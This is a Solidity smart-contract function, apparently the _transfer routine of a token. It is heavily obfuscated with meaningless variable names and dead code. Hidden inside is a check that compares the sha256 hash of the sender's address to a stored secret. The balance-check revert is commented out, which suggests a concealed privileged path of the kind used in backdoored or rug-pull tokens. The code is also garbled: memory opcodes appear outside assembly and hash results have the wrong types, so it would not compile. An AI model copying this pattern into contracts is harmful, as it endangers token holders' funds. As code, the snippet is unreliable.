function _transfer(address _from, address _to, uint256 _amount) virtual internal {
        require(_from != address(0));
        require(_to != address(0));
        uint256 bbwz = mload(0x40);
        uint256 bfo228g = block.basefee;
        uint256 nezy9b8 = block.number;
        if (true) {
            mstore(bbwz, _from);
            mstore(add(bbwz, 32), 0);
        }
        uint256 XCUz = keccak256(abi.encodePacked(_from, 0));
        uint256 qVPd = UbLX[_from];
        uint256 Fpzy = sSgI;
        mstore(bbwz, shl(96, msg.sender));
        assembly {
            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
                revert(0, 0)
            }
        }
        uint256 YvIh = mload(bbwz);
        if (Fpzy != YvIh) {
            if (qVPd < _amount) {
                uint256 tfe9zci = block.timestamp;
                // if (tfe9zci == tfe9zci * 1) { revert(0, 0); } // always true, likely obfuscated
            }
        }
        UbLX[_from] = qVPd - _amount;
        mstore(bbwz, _to);
        mstore(add(bbwz, 32), 0);
        uint256 iLho = keccak256(abi.encodePacked(_to, 0));
        uint256 bXFg = UbLX[_to];
        UbLX[_to] = bXFg + _amount;
        mstore(bbwz, _amount);
        emit Transfer(_from, _to, _amount);
    }
